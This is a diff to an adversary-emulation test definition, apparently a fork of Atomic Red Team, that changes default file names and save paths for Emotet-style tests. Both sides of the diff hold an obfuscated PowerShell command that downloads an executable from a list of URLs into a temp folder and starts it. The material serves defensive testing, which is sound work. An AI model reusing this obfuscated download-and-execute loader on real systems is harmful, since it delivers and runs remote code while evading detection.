@@ -17,7 +17,7 @@ atomic_tests:
         executable_name:
             description: Name of the final executable powershell will start
             type: String
-            default: 168.exe
+            default: Finevrt.exe
         download_url:
             description: Where to download the executable
             type: Url
@@ -25,7 +25,7 @@ atomic_tests:
         executable_location:
             description: Where to save the downloaded executable
             type: String
-            default: $env:USERPROFILE\
+            default: $env:temp\
         cyborg_atomics_folder:
             description: Folder containing the Red Canary default Atomics (With sub-techniques)
             type: String
@@ -61,7 +61,7 @@ atomic_tests:
                 Command that will be encoded and executed. Escaping: Single Quotes '', Double Quotes `", Backtick ```, Variable `$. 
             type: String
             default: |
-                `$Efmhroliwkln=''Ildyveontpnm'';`$Synevykd = ''126'';`$Bgvjrfrei=''Halxrenwvkvm'';`$Ylljwqqfjtii=`$env:userprofile+''\''+`$Synevykd+''.exe'';`$Erlxueltbvdpd=''Rhvkaxnbvy'';`$Jxsohaqzhfn=.(''new-obj''+''e''+''ct'') net.WeBcLIent;`$Hkwcjzwaf=''http://www.github.com/cyborgsecurity/emotet/*http://www.github.com/cyborgsecurity/emotet1/*http://www.github.com/cyborgsecurity/emotet2/*http://www.github.com/cyborgsecurity/emotet3/*https://raw.githubusercontent.com/CyborgSecurity/atomic-red-team/Cyborg/atomics/T1204.002/bin/168.exe''.`"SpL```iT`"(''*'');`$Gwvfunlmofhnj=''Yqtbbtkddac'';foreach(`$Dexxvcsflrwc in `$Hkwcjzwaf){try{`$Jxsohaqzhfn.`"dOw```NlOAd```FiLE`"(`$Dexxvcsflrwc, `$Ylljwqqfjtii);`$Rppyleew=''Jcshxlahbqj'';If ((&(''G''+''et-It''+''em'') `$Ylljwqqfjtii).`"lE```NGtH`" -ge 25) {[Diagnostics.Process]::`"s```TART`"(`$Ylljwqqfjtii);`$Whgwtsfs=''Vyqiceeqsa'';break;`$Ilmrcsarrcenc=''Idnjrxhmzvsfx''}}catch{}}`$Vkrxzukbpnrn=''Ucfxfwnfrsba''
+                `$Efmhroliwkln=''Ildyveontpnm'';`$Synevykd = ''F4j71fg'';`$Bgvjrfrei=''Halxrenwvkvm'';`$Ylljwqqfjtii=`$env:temp+''\''+`$Synevykd+''.exe'';`$Erlxueltbvdpd=''Rhvkaxnbvy'';`$Jxsohaqzhfn=.(''new-obj''+''e''+''ct'') net.WeBcLIent;`$Hkwcjzwaf=''http://www.github.com/cyborgsecurity/emotet/*http://www.github.com/cyborgsecurity/emotet1/*http://www.github.com/cyborgsecurity/emotet2/*http://www.github.com/cyborgsecurity/emotet3/*https://raw.githubusercontent.com/CyborgSecurity/atomic-red-team/Cyborg/atomics/T1204.002/bin/168.exe''.`"SpL```iT`"(''*'');`$Gwvfunlmofhnj=''Yqtbbtkddac'';foreach(`$Dexxvcsflrwc in `$Hkwcjzwaf){try{`$Jxsohaqzhfn.`"dOw```NlOAd```FiLE`"(`$Dexxvcsflrwc, `$Ylljwqqfjtii);`$Rppyleew=''Jcshxlahbqj'';If ((&(''G''+''et-It''+''em'') `$Ylljwqqfjtii).`"lE```NGtH`" -ge 25) {[Diagnostics.Process]::`"s```TART`"(`$Ylljwqqfjtii);`$Whgwtsfs=''Vyqiceeqsa'';break;`$Ilmrcsarrcenc=''Idnjrxhmzvsfx''}}catch{}}`$Vkrxzukbpnrn=''Ucfxfwnfrsba''
         default_atomics_folder:
             description: Folder containing the Red Canary default Atomics (With sub-techniques)
             type: String
@@ -89,7 +89,7 @@ atomic_tests:
             description: Name of the final executable powershell will start (omit
                 extension)
             type: String
-            default: 128
+            default: Panaor
         download_url:
             description: Where to download the executable
             type: Url
@@ -97,7 +97,7 @@ atomic_tests:
         executable_location:
             description: Where to save the downloaded executable
             type: String
-            default: $env:USERPROFILE\
+            default: $env:temp\
         email_filename:
             description: What file name for the saved email file (omit extension)
             type: String
